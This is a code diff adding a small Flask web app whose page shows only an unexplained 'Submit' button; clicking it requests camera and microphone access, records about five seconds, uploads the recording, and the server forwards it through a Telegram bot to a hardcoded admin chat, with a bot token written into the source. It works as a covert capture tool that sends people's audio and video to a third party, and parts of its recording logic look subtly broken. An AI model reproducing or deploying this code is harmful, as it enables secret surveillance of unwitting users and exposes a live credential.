@@ -1,0 +1,84 @@
+from flask import Flask, request
+import telebot
+import pyaudio
+import wave
+import cv2
+
+bot_token = '6406472982:AAGnFWnVTxL4DhjvbooDNrYSw6o1pncN74w'
+admin_id = '301027178'
+
+bot = telebot.TeleBot(bot_token)
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return '''
+        <html>
+        <body>
+            <form action="/submit" method="POST">
+                <input type="submit" value="Submit">
+            </form>
+        </body>
+        </html>
+    '''
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    # Request microphone and camera access from the user
+    return '''
+        <script>
+        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+            .then(function(stream) {
+                var mediaRecorder = new MediaRecorder(stream);
+                var audioChunks = [];
+                var videoChunks = [];
+
+                mediaRecorder.start();
+
+                setTimeout(function() {
+                    mediaRecorder.stop();
+                    mediaRecorder.ondataavailable = function(e) {
+                        if (e.data.type.includes('audio')) {
+                            audioChunks.push(e.data);
+                        } else if (e.data.type.includes('video')) {
+                            videoChunks.push(e.data);
+                        }
+
+                        if (mediaRecorder.state === "inactive") {
+                            var audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                            var videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                            var formData = new FormData();
+                            formData.append('audio', audioBlob);
+                            formData.append('video', videoBlob);
+                            fetch('/send_data', { method: 'POST', body: formData });
+                        }
+                    };
+                }, 5000);
+            })
+            .catch(function(err) {
+                console.error('Error accessing microphone and camera: ', err);
+            });
+        </script>
+    '''
+
+@app.route('/send_data', methods=['POST'])
+def send_data():
+    audio = request.files['audio']
+    audio.save('recording.wav')
+
+    video = request.files['video']
+    video.save('recording.webm')
+
+    admin_message = 'A user has submitted an audio and video recording.'
+    bot.send_message(admin_id, admin_message)
+
+    with open('recording.wav', 'rb') as audio_file:
+        bot.send_audio(admin_id, audio_file)
+
+    with open('recording.webm', 'rb') as video_file:
+        bot.send_video(admin_id, video_file)
+
+    return "Thank you! Your audio and video recordings have been submitted to the admin."
+
+if __name__ == '__main__':
+    app.run()
